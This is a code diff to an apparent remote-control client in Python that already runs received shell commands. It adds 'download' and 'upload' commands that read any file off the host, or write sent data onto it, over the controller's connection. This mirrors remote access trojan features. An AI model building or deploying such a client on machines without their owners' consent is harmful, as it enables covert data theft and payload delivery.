@@ -2,6 +2,7 @@ import socket
 import uuid
 import json
 import threading
+import base64
 import getpass
 import platform
 import subprocess
@@ -114,6 +115,10 @@ class Client:
             }
         elif ctype == 'execute':
             return self.execute_command(command.get('command'))
+        elif ctype == 'download':
+            return self.download_file(command.get('path'))
+        elif ctype == 'upload':
+            return self.upload_file(command.get('path'), command.get('data'))
         else:
             return None
 
@@ -202,6 +207,60 @@ class Client:
                 }
         except Exception as e:
             return {'status': 'error', 'command': cmd, 'message': f'cd 命令执行错误: {str(e)}'}
+
+    def download_file(self, remote_path):
+        try:
+            if not remote_path:
+                return {'status': 'error', 'message': '远程文件路径不能为空'}
+            remote_path = os.path.expanduser(remote_path)
+            if not os.path.isabs(remote_path):
+                remote_path = os.path.join(self.current_directory, remote_path)
+            remote_path = os.path.normpath(remote_path)
+
+            if not os.path.isfile(remote_path):
+                return {'status': 'error', 'message': f'文件不存在: {remote_path}'}
+
+            with open(remote_path, 'rb') as f:
+                file_bytes = f.read()
+
+            return {
+                'status': 'success',
+                'message': f'文件读取成功: {remote_path}',
+                'path': remote_path,
+                'size': len(file_bytes),
+                'data': base64.b64encode(file_bytes).decode('utf-8')
+            }
+        except Exception as e:
+            return {'status': 'error', 'message': f'读取文件失败: {e}'}
+
+    def upload_file(self, remote_path, data_b64):
+        try:
+            if not remote_path:
+                return {'status': 'error', 'message': '远程保存路径不能为空'}
+            if not data_b64:
+                return {'status': 'error', 'message': '上传数据为空'}
+
+            remote_path = os.path.expanduser(remote_path)
+            if not os.path.isabs(remote_path):
+                remote_path = os.path.join(self.current_directory, remote_path)
+            remote_path = os.path.normpath(remote_path)
+
+            file_bytes = base64.b64decode(data_b64.encode('utf-8'))
+            parent = os.path.dirname(remote_path)
+            if parent:
+                os.makedirs(parent, exist_ok=True)
+
+            with open(remote_path, 'wb') as f:
+                f.write(file_bytes)
+
+            return {
+                'status': 'success',
+                'message': f'上传成功: {remote_path}',
+                'path': remote_path,
+                'size': len(file_bytes)
+            }
+        except Exception as e:
+            return {'status': 'error', 'message': f'写入文件失败: {e}'}
 
     def start(self):
         while True:
